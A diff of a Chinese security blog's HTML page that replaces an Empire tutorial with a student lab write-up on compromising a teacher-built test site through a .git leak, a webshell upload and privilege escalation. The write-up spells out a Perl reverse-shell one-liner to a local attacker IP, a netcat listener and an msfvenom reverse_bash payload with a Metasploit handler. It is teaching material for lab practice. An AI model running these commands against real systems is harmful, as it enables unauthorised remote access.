@@ -5,11 +5,9 @@
 
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="域渗透神器Empire的一次简单渗透, pgg,信息安全，小白教程，情感博主">
-    <meta name="description" content="域渗透神器Empire的一次简单渗透​          需要工具:win7系统    kail系统
-​     前言：在日常的学习中，总是会把学过的知识遗忘，那我们就把它写成博客，供自己与他们一起学习
-
-​      Empire的安装:">
+    <meta name="keywords" content="对网站后台的一次大马攻击并反弹提权, pgg,信息安全，小白教程，情感博主">
+    <meta name="description" content="对网站后台的一次大马攻击并反弹提权前言：   经常使用一句话木马，总感觉没有什么存在感，今天第一次使用大马，很是有点激动的
+所需工具： 测试网站，是老师帮我们搭建的，小伙伴们千万不要用别人的网站做实验哦大马，大马是在https://gith">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +15,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>域渗透神器Empire的一次简单渗透 | pgg学长</title>
+    <title>对网站后台的一次大马攻击并反弹提权 | pgg学长</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -59,13 +57,13 @@
 
 
 
-<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
+<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/22.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        域渗透神器Empire的一次简单渗透
+                        对网站后台的一次大马攻击并反弹提权
                     </div>
                 </div>
             </div>
@@ -87,55 +85,73 @@
                 
 
                 <span class="post-date">
-                    <i class="fa fa-clock-o fa-fw"></i>2019-04-14
+                    <i class="fa fa-clock-o fa-fw"></i>2019-04-22
                 </span>
             </div>
         </div>
         <hr>
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="域渗透神器Empire的一次简单渗透"><a href="#域渗透神器Empire的一次简单渗透" class="headerlink" title="域渗透神器Empire的一次简单渗透"></a><strong>域渗透神器Empire的一次简单渗透</strong></h1><p>​          <strong>需要工具:win7系统    kail系统</strong></p>
-<p>​     前言：在日常的学习中，总是会把学过的知识遗忘，那我们就把它写成博客，供自己与他们一起学习</p>
+                <h1 id="对网站后台的一次大马攻击并反弹提权"><a href="#对网站后台的一次大马攻击并反弹提权" class="headerlink" title="对网站后台的一次大马攻击并反弹提权"></a>对网站后台的一次大马攻击并反弹提权</h1><p><strong>前言：</strong>   <em>经常使用一句话木马，总感觉没有什么存在感，今天第一次使用大马，很是有点激动的</em></p>
+<p><u>所需工具： 测试网站，是老师帮我们搭建的，小伙伴们千万不要用别人的网站做实验哦大马，大马是在<a href="https://github.com/" target="_blank" rel="noopener">https://github.com</a>上找到的，大家要仔细分析，千万不要被黑吃黑</u></p>
 <ol>
-<li>​      <u>Empire的安装:</u></li>
+<li><p><em>实验开始，老师给了一段ip  192.168.0.127拿到ip  我先用nmap扫描看看</em></p>
+<p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/1.png"></p>
+</li>
 </ol>
-<pre><code>Git clone https://github.com/EmpireProject/Empire.git
-Cd Empire/
-Cd setup/
-./install.sh
-</code></pre><ol start="2">
-<li><pre><code> 现在就是第一步，打开Empire
- 首先 cd Empire/
- 接着 cd setup/
- 最后  ./reset.sh  就能打开了 下面是我的演示图片
-</code></pre></li>
-</ol>
-<p><img src="http://kan.027cgb.com/613977/1.png"></p>
+<p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/2.png"></p>
+<ol start="2">
+<li><p><em>它告诉我们 博客正在搭建  既然有的话  那我就得扫一下它的目录了</em></p>
+<p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/3.png"></p>
 <ol start="3">
-<li><u>可以看到，有285个模块，0个监听，还有0个代理,输入listeners  进入监听</u></li>
+<li><em>不得了 .git源码泄露了   还爆出了admin.php等目录，我们先把他源码爆出了，使用 GitHack  嗯，你们可以去<a href="https://github.com/" target="_blank" rel="noopener">https://github.com</a>下载它   开始爆了</em></li>
 </ol>
-<p><img src="http://kan.027cgb.com/613977/2.png"></p>
+</li>
+</ol>
+<p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/4.png"></p>
+<p>爆出来了我们去看一看</p>
+<p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/5.png"></p>
 <ol start="4">
-<li><u>用 info查看需要设置的选项，设置后使用execute运行</u></li>
-</ol>
-<p><img src="http://kan.027cgb.com/613977/3.png"></p>
-<p><img src="http://kan.027cgb.com/613977/4.png"></p>
+<li><p><em>直接就出来了账号密码  我们去访问 admin.php  使用这个账号密码  看能不能登录</em></p>
+<p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/6.png"></p>
+<p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/7.png"></p>
 <ol start="5">
-<li><u>生成载荷 mian命令返回主菜单设置listener，然后执行execute生成dll木马,存在/tmp/launcher.dll中</u></li>
+<li><p><em>现在上传大马，看看能不能连接</em></p>
+<p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/8.png"></p>
+<p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/9.png"></p>
+</li>
 </ol>
-<p><img src="http://kan.027cgb.com/613977/5.png"></p>
-<p><img src="http://kan.027cgb.com/613977/6.png"></p>
+</li>
+</ol>
 <ol start="6">
-<li><u>Win7 打开cmd  运行这串代码而那个cmd一闪而过。这就相当于得到一个MSF会话了 选择Jdrops进入会话,进入终端输入help查看可以使用的命令</u></li>
+<li><p>*现在我们开始反弹提权  木马shell打命令</p>
+<p>perl -e’use Socket;$i=”192.168.0.135”;$p=1235;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);};’</p>
+<p>kail 命令打 nc –lvp 1235*</p>
+</li>
 </ol>
-<p><img src="http://kan.027cgb.com/613977/7.png"></p>
+<p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/10.png"></p>
+<p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/11.png"></p>
+<p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/12.png"></p>
+<p>我们cd ..  看看根目录</p>
+<p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/13.png"></p>
 <ol start="7">
-<li><u> 我们来通过shell 截被攻击机屏幕的截图</u></li>
+<li><p><em>Home 是储存账户信息的 我们进去看看</em></p>
+<p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/14.png"></p>
+</li>
+<li><p><em>我们用exp打这个文件   开一个kali界面   使用命令：msfvenom -p<br>  cmd/unix/reverse_bash LHOST=192.168.0.153 LPORT=1143</em></p>
+<p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/15.png"></p>
+</li>
+<li><p><em>现在我们把它加到.sh文件中  ，这里我们就用kail的shell加</em></p>
+<p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/16.png"></p>
+</li>
+<li><p><em>然后我们kail用msf进入监听模块，去监听他   监听exp =  exploit/multi/handler  Payload是我们生成时候用的payload</em></p>
+<p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/17.png"></p>
+<p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/18.png"></p>
+<p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/19.png"></p>
+</li>
 </ol>
-<p><img src="http://kan.027cgb.com/613977/8.png"></p>
-<p><img src="http://kan.027cgb.com/613977/9.png"></p>
-<p><strong>本次实验就到此为止，希望同学们早日成才</strong></p>
-<p>#<u>注</u>：<strong><em>珍惜一个人的生活</em></strong></p>
+<p><del>一次提权就结束了 实际操作还是需要多多练习呢</del></p>
+<p>#注：  <strong>生活就是冲着未来，不要总沉浸在悲伤里</strong></p>
 
             </div>
             <hr>
@@ -266,7 +282,7 @@ Cd setup/
                     <span class="reprint-tip">转载请注明: </span>
                     <a href="https://pgg666.org" class="b-link-green">pgg学长</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2019/04/14/域渗透神器Empire的一次简单渗透/" class="b-link-green">域渗透神器Empire的一次简单渗透</a>
+                    <a href="/2019/04/22/对网站后台的一次大马攻击并反弹提权/" class="b-link-green">对网站后台的一次大马攻击并反弹提权</a>
                 </p>
             </div>
         </div>
@@ -288,7 +304,7 @@ Cd setup/
     <div class="row article-row">
         
         <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge left-badge text-color">上一篇</div>
+            <div class="article-badge left-badge text-color">本篇</div>
             <div class="card">
                 <a href="/2019/04/22/对网站后台的一次大马攻击并反弹提权/">
                     <div class="card-image">
@@ -303,9 +319,9 @@ Cd setup/
                     <div class="summary">对网站后台的一次大马攻击并反弹提权前言：   经常使用一句话木马，总感觉没有什么存在感，今天第一次使用大马，很是有点激动的
 所需工具： 测试网站，是老师帮我们搭建的，小伙伴们千万不要用别人的网站做实验哦大马，大马是在https://gith</div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-04-22
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-04-22
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-user fa-fw"></i>
@@ -314,6 +330,7 @@ Cd setup/
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -322,31 +339,23 @@ Cd setup/
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">下一篇</div>
             <div class="card">
-                <a href="/2019/01/17/php代码审计篇之伪协议/">
+                <a href="/2019/04/14/域渗透神器Empire的一次简单渗透/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="伪协议">
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="域渗透神器Empire的一次简单渗透">
                         
-                        <span class="card-title">伪协议</span>
+                        <span class="card-title">域渗透神器Empire的一次简单渗透</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">代码审计之伪协议有四种常见伪协议：
+                    <div class="summary">域渗透神器Empire的一次简单渗透​          需要工具:win7系统    kail系统
+​     前言：在日常的学习中，总是会把学过的知识遗忘，那我们就把它写成博客，供自己与他们一起学习
 
-file://协议 
-php://filter协议 
-php://input协议 
-data://协议
-
-file://协议 :用于访问本地系统文件
-
-首先创建一个可控的php文件
-
-然后再生成一个1.</div>
+​      Empire的安装:</div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-01-17
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-04-14
                             </span>
                         <span class="publish-author">
                             
